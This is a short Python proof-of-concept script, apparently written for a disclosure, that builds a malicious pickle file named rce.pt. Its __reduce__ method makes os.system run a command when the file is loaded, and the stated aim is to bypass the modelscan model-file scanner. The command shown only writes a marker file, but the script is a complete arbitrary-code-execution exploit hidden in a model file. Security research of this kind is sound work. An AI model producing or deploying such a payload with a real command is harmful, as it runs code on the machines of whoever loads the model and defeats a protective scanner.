# PoC Generator for modelscan PyTorch Bypass
import pickle, os

class Pwn:
    def __reduce__(self):
        # Same marshal+types chain as the .pkl PoC
        return (os.system, ('echo PWNED_P4 > pwned_p4.txt',))

if __name__ == '__main__':
    # PyTorch .pt is essentially pickle wrapped in a ZIP.
    # For a minimal PoC, save a raw pickle with .pt extension
    # (modelscan treats .pt the same as any pickle-based format).
    with open('rce.pt', 'wb') as f:
        pickle.dump(Pwn(), f)
    print('PoC generated: rce.pt')
